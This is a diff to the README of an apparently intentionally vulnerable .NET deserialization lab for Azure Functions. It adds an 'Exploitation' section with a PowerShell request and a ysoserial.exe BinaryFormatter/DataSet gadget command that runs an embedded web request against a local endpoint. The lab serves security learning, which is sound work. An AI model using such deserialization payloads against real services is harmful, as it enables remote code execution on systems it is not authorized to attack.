@@ -12,6 +12,18 @@ WARNING: DO NOT DEPLOY THIS TO AZURE. Should never run outside of a controlled e
 
 So you're going to deploy it to Azure. Kinda wanted to see if you give it access to a keyvault, can you figure out how to READ the keyvault from inside?  Deploy an AzureVM, isolate it to just your IP. Then go to the network settings of the deployed function app and isolate it with Network Security Groups to just that IP. Then see what you can do as the application.  
 
+## Exploitation
+Payload
+
+```powershell
+$p = @{name=hostname};Invoke-WebRequest -Uri http://localhost:7298/api/triggerwarning -Method POST -Body ($p | ConvertTo-Json) -ContentType "application/json" -UseBasicParsing
+
+	
+.\ysoserial.exe -f BinaryFormatter -g DataSet -c "Invoke-WebRequest http://localhost:7298/api/triggerwarning -Method POST -Body "we in here" -ContentType 'application/json' -UseBasicParsing" -t
+```
+
+
+
 Plan to add other routes for other Deserialization labs, but for now, here are the bklog posts I'm going to be reading 
 
 ## .Net Deserialization Resources
